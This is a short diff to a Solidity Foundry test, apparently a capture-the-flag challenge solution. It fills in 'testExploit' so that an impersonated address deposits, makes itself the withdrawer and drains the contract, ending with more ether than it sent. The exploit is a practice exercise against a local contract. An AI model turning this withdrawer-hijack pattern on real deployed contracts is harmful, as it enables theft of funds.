@@ -18,7 +18,12 @@ contract Challenge3Test is Test {
     }
 
     function testExploit() public {
-        // playerScript(address(test));
+        vm.startPrank(address(1));
+        vm.deal(address(1), 1 ether);
         test.deposit{value: 1}();
+        test.setWithdrawer{value: 2}(address(1));
+        test.withdraw();
+        vm.stopPrank();
+        assertEq(address(1).balance, 1.1 ether);
     }
 }
